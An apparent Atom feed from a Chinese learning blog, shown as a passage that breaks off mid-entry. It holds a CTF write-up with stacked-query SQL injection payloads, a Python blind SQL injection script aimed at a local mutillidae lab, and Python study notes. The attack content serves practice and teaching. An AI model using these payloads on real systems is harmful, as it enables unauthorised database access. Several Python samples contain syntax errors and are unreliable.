<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jacen&#39;s learing journey</title>
  
  <subtitle>How To Say</subtitle>
  <link href="http://jacen-cpu.github.io/atom.xml" rel="self"/>
  
  <link href="http://jacen-cpu.github.io/"/>
  <updated>2021-07-22T03:32:31.775Z</updated>
  <id>http://jacen-cpu.github.io/</id>
  
  <author>
    <name>Jacen</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019强网杯随便注</title>
    <link href="http://jacen-cpu.github.io/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
    <id>http://jacen-cpu.github.io/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
    <published>2021-07-22T01:19:52.000Z</published>
    <updated>2021-07-22T03:32:31.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>打开题目，显然是<code>SQL注入</code>，试一试常用的注入手法，发现参数使用单引号闭合。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1 # 返回值有</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 无返回值</span><br></pre></td></tr></table></figure><p>接着我们用<code>order by</code>探测列数。发现当前的tables是两列。</p><p>我们试着用<code>union</code>查询看一下,这里我们发现报错。</p><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_10-29-54.png" class=""><p><code>/select|update|delete|drop|insert|where|\./i</code>普通的注入和报错注入都用不了哎。</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的<code>sql</code>语句了。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>极为苛刻，容易受到<code>API</code>，或者数据库引擎，权限的限制。只有当调用数据库函数支持执行多条<code>sql</code>语句时才能够使用。</p><h2 id="利用堆叠注入"><a href="#利用堆叠注入" class="headerlink" title="利用堆叠注入"></a>利用堆叠注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_10-48-50.png" class=""><p>成功注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_10-48-50.png" class=""><p>发现table。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from `1919810931114514`; #</span></span><br></pre></td></tr></table></figure><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_11-03-10.png" class=""><p>发现flag的列。</p><p>因为我们用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 # </span></span><br></pre></td></tr></table></figure><p>发现words是当前表。</p><p>下面我们修改表名和列名，以便爆出表1919810931114514中的数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words rename <span class="keyword">to</span> words1; <span class="keyword">alter</span> <span class="keyword">table</span> `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> words;</span><br></pre></td></tr></table></figure><p>修改列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words change flag id <span class="type">varchar</span>(<span class="number">50</span>);</span><br></pre></td></tr></table></figure><p>最终我们的playload为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; alter table words rename to words1; alter table `1919810931114514` rename to words; alter table words change flag id varchar(50); #</span></span><br></pre></td></tr></table></figure><p>这时我们再用<code>1&#39; or 1=1 # </code>得到flag</p><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_11-23-55.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;随便注&quot;&gt;&lt;a href=&quot;#随便注&quot; class=&quot;headerlink&quot; title=&quot;随便注&quot;&gt;&lt;/a&gt;随便注&lt;/h1&gt;&lt;p&gt;打开题目，显然是&lt;code&gt;SQL注入&lt;/code&gt;，试一试常用的注入手法，发现参数使用单引号闭合。&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="buu_writeup" scheme="http://jacen-cpu.github.io/categories/buu-writeup/"/>
    
    
    <category term="强网杯" scheme="http://jacen-cpu.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>SQL盲注脚本</title>
    <link href="http://jacen-cpu.github.io/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
    <id>http://jacen-cpu.github.io/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</id>
    <published>2021-07-21T11:18:52.000Z</published>
    <updated>2021-07-21T12:49:31.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="get-database-name"><a href="#get-database-name" class="headerlink" title="get_database_name"></a>get_database_name</h1><p>今天写了<code>SQL</code>盲注中的脚本，复盘一下。</p><p>首先我们启动靶场，这里我用的是’mutillidae’，git地址：<a class="link"   href="https://github.com/webpwnized/mutillidae.git" >https://github.com/webpwnized/mutillidae.git<i class="fas fa-external-link-alt"></i></a></p><p>我们进入sql盲注的登录页面</p><img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-47-56.png" class=""><p>我们先随便输个值，用burpsuite抓个包，发现返回值是200。</p><img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-49-28.png" class=""><img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-50-52.png" class=""><p>接着我们用一个常见的绕过方法试一下，输入<code>&#39; or 1=1 #&#39;</code>发现返回值是302。</p><img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-52-37.png" class=""><p>我们把<code>request</code>复制到我们的脚本中，提取当中的有用信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/index.php?page=login.php&#x27;</span></span><br><span class="line">heads = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://localhost/index.php?page=login.php&amp;popUpNotificationCode=LOU1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="comment">#&#x27;Content-Length&#x27;: &#x27;65&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=spcv5ud00rp549tfso3ora9ej2; showhints=1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;adminpass&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login-php-submit-button&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get-database-len"><a href="#get-database-len" class="headerlink" title="get_database_len"></a>get_database_len</h2><p>要想得到数据库的名字第一步就是要得到数据库的长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_len</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        database_L = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#x27; or length(database())= &quot;</span>+ <span class="built_in">str</span>(i) +<span class="string">&quot; #&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;adminpass&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;login-php-submit-button&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r_database_len = requests.post(url=url, headers=heads, data=database_L, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r_database_len.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure><p>函数很简单，但是这里务必要有<code>allow_redirects=False</code>。</p><h2 id="get-database-name-1"><a href="#get-database-name-1" class="headerlink" title="get_database_name"></a>get_database_name</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_name</span>(<span class="params">length = <span class="number">10</span></span>):</span></span><br><span class="line">    database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;qwetyuioplkjhgfdsazxcvbnm0123456789&#x27;</span>:</span><br><span class="line">            username = <span class="string">&quot; &#x27; or left(database(), &quot;</span> + <span class="built_in">str</span>(i) +  <span class="string">&quot;) = &#x27;&quot;</span>  + database_name + <span class="built_in">str</span>(j) + <span class="string">&quot;&#x27; # &quot;</span></span><br><span class="line">            <span class="comment">#print(username)</span></span><br><span class="line">            data_database_name = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;login-php-submit-button&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r_database_name = requests.post(url=url, headers=heads, data=data_database_name, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r_database_name.status_code == <span class="number">302</span>:</span><br><span class="line">                database_name += <span class="built_in">str</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> database_name</span><br></pre></td></tr></table></figure><p>这里我主要用了mysql中的<code>left()</code>函数（从字符串左边开始截取）和判断的字符串<code>&#39;qwetyuioplkjhgfdsazxcvbnm0123456789&#39;</code>（当然还有其他更好的方法，但是博主能力有限。。。），总之我们再改一下<code>data</code>数据，大功告成。</p><p>运行效果：</p><img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_20-40-17.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;get-database-name&quot;&gt;&lt;a href=&quot;#get-database-name&quot; class=&quot;headerlink&quot; title=&quot;get_database_name&quot;&gt;&lt;/a&gt;get_database_name&lt;/h1&gt;&lt;p&gt;今天写了&lt;code&gt;</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
    <category term="python脚本" scheme="http://jacen-cpu.github.io/tags/python%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>Python数据结构</title>
    <link href="http://jacen-cpu.github.io/2021/07/20/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <id>http://jacen-cpu.github.io/2021/07/20/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</id>
    <published>2021-07-20T04:03:37.000Z</published>
    <updated>2021-07-20T04:03:37.564Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL盲注</title>
    <link href="http://jacen-cpu.github.io/2021/07/19/SQL%E7%9B%B2%E6%B3%A8/"/>
    <id>http://jacen-cpu.github.io/2021/07/19/SQL%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-07-19T06:33:55.000Z</published>
    <updated>2021-07-20T04:02:32.267Z</updated>
    
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
    <category term="SQL注入" scheme="http://jacen-cpu.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python的流程控制</title>
    <link href="http://jacen-cpu.github.io/2021/07/18/Python%E7%9A%84%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
    <id>http://jacen-cpu.github.io/2021/07/18/Python%E7%9A%84%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</id>
    <published>2021-07-18T13:25:29.000Z</published>
    <updated>2021-07-19T08:40:42.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python的流程控制"><a href="#Python的流程控制" class="headerlink" title="Python的流程控制"></a>Python的流程控制</h1><p>今天看了python的流程控制，复习一下。</p><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please enter an integer:&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Zero&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> x = <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Single&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;More&quot;</span>)</span><br><span class="line">          </span><br></pre></td></tr></table></figure><p>这里关键字<code>elif</code>是<code>else if</code>的缩写，有效地避免过深的缩进。</p><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>Python 的<code>for</code>语句依据任意序列（链表或字符串）中的子项，按它们在序列中的顺序来进行迭代。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">words = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;python&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">    <span class="built_in">print</span>(w, <span class="built_in">len</span>(w)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>在迭代过程中修改迭代序列不安全（只有在使用链表这样的可变序列时才会有这样的情况）。如果你想要修改你迭代的序列（例如，复制选择项），可以迭代它的复本。使用切割标识就可以很方便的做到这一点。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words[:]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(w) &gt; <span class="number">6</span>:</span><br><span class="line">        words.insert(<span class="number">0</span>, w)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="range"><a href="#range" class="headerlink" title="range()"></a>range()</h2><p>这是python的一个内置函数，它会为你生成一个等差链表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">/*</span><br><span class="line"><span class="number">0</span></span><br><span class="line">    <span class="number">1</span></span><br><span class="line">    <span class="number">2</span></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">    <span class="number">4</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>此外也可以操作生成范围的始末和步长。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">range</span>(<span class="number">5</span>, <span class="number">9</span>)</span><br><span class="line"><span class="comment"># 5 through 8</span></span><br><span class="line"><span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># 0, 3, 6, 9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里注意尾部是开的</strong></p><p>我们结合上面的<code>for</code>语句可以进行迭代索引操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;Mary&#x27;</span>, <span class="string">&#x27;had&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;little&#x27;</span>, <span class="string">&#x27;lamb&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(i, a[i])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方便的话<code>enumerate()</code>最好</p><h2 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h2><p>这里的break和continue类似于C语言，这里的while循环可以有一个else子句。break同样会断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>):</span><br><span class="line">     <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n):</span><br><span class="line">         <span class="keyword">if</span> n % x == <span class="number">0</span>:</span><br><span class="line">             <span class="built_in">print</span>(n, <span class="string">&#x27;equals&#x27;</span>, x, <span class="string">&#x27;*&#x27;</span>, n//x)</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         <span class="built_in">print</span>(n, <span class="string">&#x27;is a prime number&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>):</span><br><span class="line">     <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Found an even number&quot;</span>, num)</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;Found a number&quot;</span>, num)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h2><p>pass指程序啥都不做，它用于那些语法上必须要有什么语句，但程序什么也不做的场合，例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">pass</span>  <span class="comment"># Busy-wait for keyboard interrupt (Ctrl+C)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建最小结构的类:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEmptyClass</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><p>关键字是<code>def</code>类似于C语言，但是简洁是python弱类型的优点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>函数体语句从下一行开始，必须是缩进的。</strong></p><blockquote><p>函数 <em>调用</em> 会为函数局部变量生成一个新的符号表。确切的说，所有函数中的变量赋值都是将值存储在局部符号表。变量引用首先在局部符号表中查找，然后是包含函数的局部符号表，然后是全局符号表，最后是内置名字表。因此，全局变量不能在函数中直接赋值（除非用 <code>global</code>语句命名），尽管他们可以被引用。</p></blockquote><h3 id="关于return"><a href="#关于return" class="headerlink" title="关于return"></a>关于return</h3><p>return语句从函数中返回一个值，不带表达式的return返回<code>None</code>。过程结束后也会返回<code>None</code>。</p><h3 id="深入Python函数定义"><a href="#深入Python函数定义" class="headerlink" title="深入Python函数定义"></a>深入Python函数定义</h3><h4 id="默认参数值"><a href="#默认参数值" class="headerlink" title="默认参数值"></a>默认参数值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ask_ok</span>(<span class="params">prompt, retries=<span class="number">4</span>, complaint=<span class="string">&#x27;Yes or no, please!&#x27;</span></span>):</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>它可以通过以下几种不同的方式进行调用：</p><ul><li><p>只给出必要的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ask_ok(<span class="string">&#x27;Do you really want to quit?&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>给出一个可选的参数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ask_ok(<span class="string">&#x27;OK to overwrite the file?&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>给出所有参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ask_ok(<span class="string">&#x27;OK to overwrite the file?&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;Come on, only yes or no!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p><em>默认值在函数 定义 作用域被解析，如下所示:</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">arg = i</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">i = <span class="number">6</span></span><br><span class="line">f()</span><br><span class="line"><span class="comment"># 输出1</span></span><br></pre></td></tr></table></figure><p><strong>重要警告:</strong> 默认值只被赋值一次。这使得当默认值是可变对象时会有所不同，比如列表、字典或者大多数类的实例。例如，下面的函数在后续调用过程中会累(前面)传给它的参数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, L=[]</span>):</span></span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">3</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>如果你不想让默认值在后续调用中累积，你可以像下面一样定义函数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, L=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> L <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span 